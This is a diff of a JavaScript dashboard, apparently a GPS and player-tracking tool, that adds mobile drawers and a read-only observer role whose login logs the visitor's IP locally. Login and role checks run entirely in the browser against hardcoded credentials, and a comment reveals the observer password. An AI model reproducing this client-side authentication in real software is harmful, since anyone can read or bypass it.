+    if (drawerInfoActiveTarget) drawerInfoActiveTarget.textContent = selectedTarget === 'admin' ? 'Admin' : getPlayer(selectedTarget)?.name || selectedTarget;
+    if (drawerInfoGps) drawerInfoGps.textContent = infoGps?.textContent || 'Idle';
+    if (drawerInfoLastAction) drawerInfoLastAction.textContent = infoLastAction?.textContent || '—';
+  }
+}
+
+function closeLeftDrawer() {
+  if (leftDrawer) {
+    leftDrawer.style.transform = 'translateX(-100%)';
+    setTimeout(() => {
+      leftDrawer.classList.add('hidden');
+    }, 300);
+  }
+}
+
 // ===== QUICK ACTION BUTTONS =====
 function initQuickActionButtons() {
   quickGpsBtn = $('quick-gps-btn');
@@ -1644,30 +2005,30 @@ function initQuickActionButtons() {
   quickNetworkBtn = $('quick-network-btn');
   quickClearBtn = $('quick-clear-btn');
   backToMenuBtn = $('back-to-menu-btn');
-
+  
   quickGpsBtn?.addEventListener('click', () => {
     selectedTarget = 'admin';
     if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
     appendLog('[Quick Action] Admin GPS scan initiated', LOG.orange);
     runHybridGeolocation('Admin');
   });
-
+  
   quickStatusBtn?.addEventListener('click', () => {
     handleCommand('/status');
   });
-
+  
   quickBatteryBtn?.addEventListener('click', () => {
     handleCommand('/battery');
   });
-
+  
   quickNetworkBtn?.addEventListener('click', () => {
     handleCommand('/network');
   });
-
+  
   quickClearBtn?.addEventListener('click', () => {
     handleCommand('/clear');
   });
-
+  
   backToMenuBtn?.addEventListener('click', () => {
     showLoading('กลับสู่เมนูหน้าแรก...');
     setTimeout(() => {
@@ -1677,24 +2038,81 @@ function initQuickActionButtons() {
   });
 }
 
+// ===== ADMIN OBSERVER HELPER FUNCTIONS =====
+async function getClientIP() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    if (res.ok) {
+      const data = await res.json();
+      return data.ip || null;
+    }
+  } catch (_) {}
+  return null;
+}
+
+function getAdminObserverName() {
+  try {
+    const ips = JSON.parse(localStorage.getItem(ADMIN_OBSERVER_KEY) || '{}');
+    const keys = Object.keys(ips);
+    const nextNum = (keys.length % 99) + 1;
+    return `Admin${String(nextNum).padStart(2, '0')}`;
+  } catch (_) {
+    return 'Admin01';
+  }
+}
+
+function saveAdminObserverIP(ip) {
+  try {
+    const ips = JSON.parse(localStorage.getItem(ADMIN_OBSERVER_KEY) || '{}');
+    ips[ip] = { lastLogin: new Date().toISOString() };
+    localStorage.setItem(ADMIN_OBSERVER_KEY, JSON.stringify(ips));
+  } catch (_) {}
+}
+
+function isObserver() {
+  return userRole === 'observer';
+}
+
+function isSuperAdmin() {
+  return userRole === 'super-admin';
+}
+
+function showObserverWarning() {
+  appendLog('⚠️ คุณไม่มีสิทธิ์ในการแก้ไขข้อมูล (สิทธิ์อ่านอย่างเดียว)', LOG.red);
+}
+
 // ===== EVENT BINDING =====
 function bindEvents() {
-  loginForm?.addEventListener('submit', (e) => {
+  loginForm?.addEventListener('submit', async (e) => {
     e.preventDefault();
     const u = $('username')?.value?.trim();
     const p = $('password')?.value;
+    
+    // Check for Super Admin (main admin) - สิทธิ์สูงสุด
     if (u === AUTH.username && p === AUTH.password) {
       showLoading('กำลังเข้าสู่ระบบ...');
       setTimeout(() => {
-        showAppSelector();
+        showDashboard(AUTH.username, false, 'super-admin');
         hideLoading();
       }, 500);
-    } else if (loginError) {
+    }
+    // Check for Observer (admin with password 'lit') - สิทธิ์ผู้สังเกตการณ์
+    else if (u === OBSERVER_AUTH.username && p === OBSERVER_AUTH.password) {
+      showLoading('กำลังเข้าสู่ระบบโหวตเป็นผู้สังเกตการณ์...');
+      const clientIP = await getClientIP();
+      const observerName = getAdminObserverName();
+      saveAdminObserverIP(clientIP);
+      setTimeout(() => {
+        showDashboard(observerName, false, 'observer');
+        hideLoading();
+      }, 500);
+    }
+    else if (loginError) {
       loginError.textContent = 'Invalid credentials — Permission Denied';
       loginError.classList.remove('hidden');
     }
   });
-
+  
   logoutBtn?.addEventListener('click', () => {
     showLoading('กำลังออกจากระบบ...');
     setTimeout(() => {
@@ -1702,39 +2120,58 @@ function bindEvents() {
       hideLoading();
     }, 500);
   });
-
+  
   gpsIconBtn?.addEventListener('click', () => {
+    if (isObserver()) {
+      showObserverWarning();
+      return;
+    }
     selectedTarget = 'admin';
     if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
     appendLog('[GPS Icon] Admin GPS scan initiated', LOG.orange);
     runHybridGeolocation('Admin');
   });
-
-  addPlayerBtn?.addEventListener('click', addPlayer);
-
+  
+  addPlayerBtn?.addEventListener('click', () => {
+    if (isObserver()) {
+      showObserverWarning();
+      return;
+    }
+    addPlayer();
+  });
+  
   commandForm?.addEventListener('submit', (e) => {
     e.preventDefault();
     const v = commandInput?.value || '';
     if (commandInput) commandInput.value = '';
     handleCommand(v);
   });
-
+  
   // App Selector - GPS Tool button
   gpsToolBtn?.addEventListener('click', () => {
     showLoading('กำลังโหลดแดชบอร์ด...');
     setTimeout(() => {
-      showDashboard(AUTH.username);
+      showDashboard(AUTH.username, false, 'super-admin');
       hideLoading();
     }, 800);
   });
-
+  
   // Right Drawer events
   drawerClose?.addEventListener('click', closeRightDrawer);
-  drawerSaveNotes?.addEventListener('click', savePlayerNotes);
-
+  drawerSaveNotes?.addEventListener('click', () => {
+    if (isObserver()) {
+      showObserverWarning();
+      return;
+    }
+    savePlayerNotes();
+  });
+  
   // Initialize Quick Action Buttons
   initQuickActionButtons();
-
+  
+  // Initialize Mobile Drawers
+  initMobileDrawers();
+  
   window.addEventListener('resize', () => {
     try { mapInstance?.invalidateSize(); } catch (_) {}
   });
